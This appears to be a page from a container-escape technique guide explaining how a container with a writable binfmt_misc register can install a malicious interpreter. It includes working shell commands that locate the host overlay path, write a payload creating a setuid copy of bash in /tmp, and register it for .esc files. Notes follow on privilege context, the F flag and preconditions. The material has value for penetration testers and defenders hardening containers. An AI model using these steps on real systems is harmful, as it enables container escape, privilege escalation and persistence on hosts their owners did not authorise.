---
title: "binfmt_misc: registering an interpreter the kernel invokes for a file format"
order: 4
description: "binfmt_misc lets userspace register interpreters for binary formats by writing to /proc/sys/fs/binfmt_misc/register. A container with that interface mounted writable registers an interpreter pointing at its payload, so that when a matching file is executed the kernel runs the interpreter. Useful where the host later executes a matching binary, with important execution-context caveats."
keywords:
  - binfmt_misc
  - interpreter registration
  - proc fs binfmt
  - container escape
  - usermode
---

# binfmt_misc

`binfmt_misc` is the kernel facility that lets userspace teach the kernel to run non-native executables by registering an interpreter keyed on a file extension or magic bytes. Registration is a write to `/proc/sys/fs/binfmt_misc/register`. A container with that procfs interface mounted writable can register an interpreter whose path points at an attacker payload. Unlike `core_pattern` or `modprobe`, the interpreter does not run as root on the host automatically: it runs in the context of whoever executes a matching file. The escape therefore depends on causing a privileged host context to execute a file that matches the registration.

Confirm the interface:

```bash
ls /proc/sys/fs/binfmt_misc/ 2>/dev/null
[ -w /proc/sys/fs/binfmt_misc/register ] && echo writable
cat /proc/sys/fs/binfmt_misc/status        # "enabled" means registrations are active
```

## Registering an interpreter

The register format is `:name:type:offset:magic:mask:interpreter:flags`. The `F` flag opens and caches the interpreter at registration time, which matters across namespaces:

```bash
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
SH
chmod +x /payload

# Register: match files with extension .esc, run them through our payload.
echo ":esc:E::esc::$host/payload:" > /proc/sys/fs/binfmt_misc/register
ls -l /proc/sys/fs/binfmt_misc/esc          # a new entry confirms registration
```

From then on, executing a `*.esc` file invokes the payload as the interpreter. Because that happens in the executing process's context, the win comes when a host-side privileged process runs such a file, or when execution occurs in a context sharing the host namespaces.

## Exploitation notes

- The interpreter runs with the privileges and namespaces of the process that executes the matching file, not as a host root helper by default. Treat this as a persistence or context-dependent primitive rather than an instant escape, unlike [core_pattern](core_pattern.md) and [modprobe path](modprobe-path.md), which the kernel runs as host root directly.
- The `F` (fix binary) flag makes the kernel resolve and hold the interpreter at registration, which can bridge the path across mount namespaces; without it the interpreter path is resolved at execution time in the executor's view.
- Writing `register` requires the host's binfmt_misc mounted writable, usually a privileged container; a read-only or unmounted interface defeats it.

## References

- [Kernel docs: binfmt_misc](https://docs.kernel.org/admin-guide/binfmt-misc.html)
- [HackTricks: binfmt_misc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
